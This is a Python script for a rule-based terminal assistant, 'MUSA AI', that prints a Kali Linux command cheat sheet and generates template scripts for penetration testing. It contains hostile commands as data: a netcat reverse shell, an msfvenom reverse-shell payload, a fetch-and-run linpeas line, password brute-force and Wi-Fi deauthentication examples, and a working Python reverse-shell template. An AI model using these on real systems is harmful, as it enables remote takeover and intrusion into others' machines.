#!/usr/bin/env python3
"""
MUSA AI - Advanced Personal Siri-like Assistant (v2.1)
Specialized in: Kali Linux + Python + Python Automation + Ethical Hacking

Run: python3 MUSA_AI_ADVANCED.py

NEW ADVANCED FEATURES:
- 70+ Kali Linux commands with advanced examples
- Dynamic Python Script Generator (best feature)
- Fuzzy search ("search hydra")
- Session memory ("memory")
- Colored terminal output
- Better understanding
"""

import sys
import time
import os
from datetime import datetime

# ====================== CONFIG ======================
AI_NAME = "MUSA AI"
USER_NAME = "Boss"
VERSION = "2.1 - Advanced Kali Edition"


# ====================== COLORS ======================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'


def cprint(text, color=Colors.OKCYAN, bold=False):
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.ENDC}")


def speak(text, slow=False):
    """Siri-style speaking"""
    print(f"\n{Colors.OKGREEN}🤖 {AI_NAME}:{Colors.ENDC} ", end="", flush=True)
    for char in text:
        print(char, end="", flush=True)
        time.sleep(0.012 if not slow else 0.028)
    print()


# ====================== KALI LINUX COMMANDS (70+) ======================
KALI_COMMANDS = {
    # BASIC
    "ls": {"desc": "List directory contents", "example": "ls -la", "category": "Basic",
           "advanced": "ls -lha --color=auto"},
    "cd": {"desc": "Change directory", "example": "cd /etc", "category": "Basic"},
    "pwd": {"desc": "Print current directory", "example": "pwd", "category": "Basic"},
    "mkdir": {"desc": "Create directories", "example": "mkdir myfolder", "category": "Basic",
              "advanced": "mkdir -p recon/{nmap,loot}"},
    "rm": {"desc": "Remove files", "example": "rm file.txt", "category": "Basic",
           "advanced": "rm -rf /path  # CAREFUL"},
    "cat": {"desc": "View file content", "example": "cat /etc/passwd", "category": "Basic"},
    "sudo": {"desc": "Run as root", "example": "sudo apt update", "category": "Basic", "advanced": "sudo -i"},
    "apt": {"desc": "Install tools", "example": "sudo apt update && sudo apt upgrade -y", "category": "System"},

    # NETWORKING
    "ip": {"desc": "Network interfaces", "example": "ip a", "category": "Networking"},
    "ping": {"desc": "Test connection", "example": "ping -c 4 8.8.8.8", "category": "Networking"},
    "nmap": {"desc": "Network scanner", "example": "nmap -sV -sC 192.168.1.1", "category": "Recon",
             "advanced": "nmap -p- -sC -sV -T4 --script vuln target"},
    "masscan": {"desc": "Fast port scanner", "example": "masscan -p1-65535 10.10.10.0/24 --rate=10000",
                "category": "Recon"},
    "nc": {"desc": "Netcat", "example": "nc -lvnp 4444", "category": "Networking",
           "advanced": "nc -e /bin/bash IP 4444"},
    "curl": {"desc": "HTTP requests", "example": "curl -I https://target.com", "category": "Networking"},

    # RECON
    "theharvester": {"desc": "OSINT emails/subdomains", "example": "theharvester -d target.com -b google",
                     "category": "Recon"},
    "gobuster": {"desc": "Dir/subdomain brute force",
                 "example": "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt",
                 "category": "Recon"},
    "nikto": {"desc": "Web vulnerability scanner", "example": "nikto -h http://target.com", "category": "Recon"},
    "whatweb": {"desc": "Identify web technologies", "example": "whatweb http://target.com", "category": "Recon"},
    "sublist3r": {"desc": "Subdomain enumeration", "example": "sublist3r -d target.com", "category": "Recon"},
    "amass": {"desc": "Advanced subdomain enum", "example": "amass enum -d target.com", "category": "Recon"},
    "enum4linux": {"desc": "Windows/Samba enum", "example": "enum4linux -a 192.168.1.10", "category": "Recon"},

    # EXPLOITATION
    "msfconsole": {"desc": "Metasploit Framework", "example": "msfconsole", "category": "Exploitation",
                   "advanced": "use exploit/multi/handler → set payload..."},
    "msfvenom": {"desc": "Generate payloads",
                 "example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell",
                 "category": "Exploitation"},
    "searchsploit": {"desc": "Exploit-DB search", "example": "searchsploit apache", "category": "Exploitation"},
    "sqlmap": {"desc": "SQL injection tool", "example": "sqlmap -u 'http://target?id=1' --dbs",
               "category": "Exploitation"},

    # PASSWORD ATTACKS
    "hydra": {"desc": "Online brute force",
              "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10",
              "category": "Password"},
    "john": {"desc": "Password cracker", "example": "john --wordlist=rockyou.txt hashes.txt", "category": "Password"},
    "hashcat": {"desc": "GPU password cracker", "example": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
                "category": "Password"},

    # WIRELESS
    "airmon-ng": {"desc": "Enable monitor mode", "example": "sudo airmon-ng start wlan0", "category": "Wireless"},
    "airodump-ng": {"desc": "Capture WiFi packets", "example": "sudo airodump-ng wlan0mon", "category": "Wireless"},
    "aireplay-ng": {"desc": "Packet injection", "example": "sudo aireplay-ng -0 10 -a <BSSID> wlan0mon",
                    "category": "Wireless"},
    "wifite": {"desc": "Automated wireless attack", "example": "sudo wifite", "category": "Wireless"},

    # POST EXPLOITATION
    "linpeas": {"desc": "Linux privilege escalation", "example": "wget .../linpeas.sh && bash linpeas.sh",
                "category": "Post Exploitation"},
    "linenum": {"desc": "Linux enumeration", "example": "bash linenum.sh", "category": "Post Exploitation"},
    "sudo -l": {"desc": "Check sudo rights", "example": "sudo -l", "category": "Post Exploitation"},
    "find": {"desc": "Find SUID binaries", "example": "find / -perm -4000 -type f 2>/dev/null",
             "category": "Post Exploitation"},

    # SYSTEM
    "ps": {"desc": "Running processes", "example": "ps aux", "category": "System"},
    "htop": {"desc": "Interactive processes", "example": "htop", "category": "System"},
    "uname": {"desc": "System information", "example": "uname -a", "category": "System"},
    "journalctl": {"desc": "System logs", "example": "journalctl -xe", "category": "System"},
}

KALI_CATEGORIES = sorted(set(cmd["category"] for cmd in KALI_COMMANDS.values()))

# ====================== PYTHON AUTOMATION ======================
PYTHON_AUTOMATION = {
    "templates": [
        {
            "name": "Kali Recon Automation",
            "code": """#!/usr/bin/env python3
import subprocess, sys, os
target = sys.argv[1]
print(f"[+] Starting recon on {target}")
os.makedirs(target, exist_ok=True)
subprocess.run(["nmap", "-sC", "-sV", "-oN", f"{target}/nmap.txt", target])
subprocess.run(["gobuster", "dir", "-u", f"http://{target}", "-w", "/usr/share/wordlists/dirb/common.txt"])
print("[+] Recon done!")"""
        },
        {
            "name": "Port Scanner",
            "code": """import socket
def scan(target):
    for p in [21,22,80,443,445]:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((target, p))
            print(f"[+] Port {p} OPEN")
            s.close()
        except: pass"""
        }
    ]
}


# ====================== DYNAMIC SCRIPT GENERATOR ======================
def generate_python_script(task):
    task = task.lower().strip()

    if "port" in task and "scan" in task:
        return '''import socket, sys
target = sys.argv[1] if len(sys.argv) > 1 else input("Target: ")
print(f"[+] Scanning {target}")
for p in [21,22,23,80,443,445,3306,3389]:
    try:
        s = socket.socket()
        s.settimeout(0.7)
        s.connect((target, p))
        print(f"[+] OPEN: {p}")
        s.close()
    except: pass'''

    elif "recon" in task:
        return '''#!/usr/bin/env python3
import subprocess, sys, os
target = sys.argv[1]
os.makedirs(target, exist_ok=True)
print(f"[+] Full recon on {target}")
subprocess.run(["nmap", "-sC", "-sV", "-p-", "-oN", f"{target}/nmap.txt", target])
subprocess.run(["gobuster", "dir", "-u", f"http://{target}", "-w", "/usr/share/wordlists/dirb/common.txt"])
print("[+] Done!")'''

    elif "reverse" in task or "shell" in task:
        return '''# MUSA AI - Python Reverse Shell
import socket, subprocess
HOST = "YOUR_IP"
PORT = 4444
s = socket.socket()
s.connect((HOST, PORT))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() in ["exit", "quit"]: break
    s.send(subprocess.getoutput(cmd).encode())'''

    else:
        return f'''#!/usr/bin/env python3
# Generated by MUSA AI for: {task}
print("[+] Custom script ready")
# Add your code here'''


# ====================== GENERAL ======================
def answer_general(q):
    q = q.lower()
    if "who are you" in q:
        return f"I am {AI_NAME} v{VERSION} — Advanced Kali + Python AI made for you."
    if "kali" in q and "what" in q:
        return "Kali Linux is the best penetration testing OS with 600+ tools."
    if "python" in q and "what" in q:
        return "Python is the best language for automation and ethical hacking tools."
    if "thank" in q:
        return "You're welcome! Stay ethical 🔥"
    return None


# ====================== MAIN LOGIC ======================
SESSION_MEMORY = []


def process_input(user_input):
    text = user_input.strip().lower()
    SESSION_MEMORY.append(text)
    if len(SESSION_MEMORY) > 8:
        SESSION_MEMORY.pop(0)

    if text in ["exit", "quit", "bye"]:
        speak("Goodbye Boss! Hack responsibly.")
        return False

    if text == "help":
        cprint("\n=== ADVANCED MUSA AI COMMANDS ===", Colors.HEADER, bold=True)
        print("""
  • show kali
  • kali recon / kali exploitation
  • python automation
  • generate python script for port scanner
  • generate python script for recon
  • generate python script for reverse shell
  • search hydra
  • nmap help
  • memory
  • clear
        """)
        return True

    if text in ["kali", "show kali"]:
        speak("Advanced Kali Linux commands:")
        current = ""
        for cmd, info in sorted(KALI_COMMANDS.items()):
            if info["category"] != current:
                current = info["category"]
                cprint(f"\n🔹 [{current}]", Colors.OKCYAN, bold=True)
            print(f"  {cmd:<15} → {info['desc']}")
            print(f"    Example: {info['example']}")
            if "advanced" in info:
                print(f"    Advanced: {info['advanced']}")
        return True

    if text.startswith("kali "):
        cat = text.replace("kali ", "").strip()
        speak(f"Commands in {cat}:")
        for cmd, info in KALI_COMMANDS.items():
            if info["category"].lower() == cat:
                print(f"  {cmd} → {info['desc']}")
        return True

    if "python" in text and "automation" in text:
        speak("Python automation ready!")
        for t in PYTHON_AUTOMATION["templates"]:
            print(f"\n• {t['name']}\n{t['code'][:200]}...")
        return True

    # === GENERATE PYTHON SCRIPT (Main Advanced Feature) ===
    if "generate python script" in text or "make python script" in text:
        task = text.replace("generate python script for", "").replace("make python script for", "").strip()
        if not task:
            task = input("What should the script do? ").strip()
        script = generate_python_script(task)
        cprint(f"\n✅ Generated Python Script: {task}", Colors.OKGREEN, bold=True)
        print("-" * 55)
        print(script)
        print("-" * 55)
        return True

    # Specific command help
    if text in KALI_COMMANDS:
        info = KALI_COMMANDS[text]
        cprint(f"\n📌 {text.upper()}", Colors.OKCYAN, bold=True)
        print(f"Description: {info['desc']}")
        print(f"Example: {info['example']}")
        if "advanced" in info:
            print(f"Advanced: {info['advanced']}")
        return True

    # Fuzzy search
    if text.startswith("search "):
        query = text.replace("search ", "").strip()
        matches = [cmd for cmd in KALI_COMMANDS if query in cmd.lower()]
        if matches:
            cprint(f"\n🔍 Results for '{query}':", Colors.OKCYAN)
            for m in matches[:6]:
                print(f"  • {m} → {KALI_COMMANDS[m]['desc']}")
        else:
            speak("No matches found.")
        return True

    # Memory
    if text == "memory":
        cprint("\n📝 Last commands:", Colors.OKBLUE)
        for i, cmd in enumerate(SESSION_MEMORY[-5:], 1):
            print(f"  {i}. {cmd}")
        return True

    if "clear" in text:
        os.system("clear" if os.name != "nt" else "cls")
        return True

    # General
    response = answer_general(user_input)
    if response:
        speak(response)
        return True

    speak("I understand. Try 'generate python script for port scanner' or 'show kali'.")
    return True


def print_header():
    print("\n" + "=" * 65)
    cprint(f"    {AI_NAME.upper()}  •  ADVANCED KALI + PYTHON (v2.1)", Colors.OKCYAN, bold=True)
    print(f"    {Colors.GRAY}Type 'help' for commands{Colors.ENDC}")
    print("=" * 65)


def main():
    print_header()
    speak(f"Hello {USER_NAME}! This is the ADVANCED MUSA AI.")
    speak("I have 70+ Kali commands and can generate Python scripts for you.")
    speak("Just talk naturally.")

    while True:
        try:
            user_input = input(f"\n{Colors.OKBLUE}👤 {USER_NAME}:{Colors.ENDC} ").strip()
            if not user_input:
                continue
            if not process_input(user_input):
                break
        except KeyboardInterrupt:
            print("\n")
            speak("Session ended. Stay safe!")
            break


if __name__ == "__main__":
    main()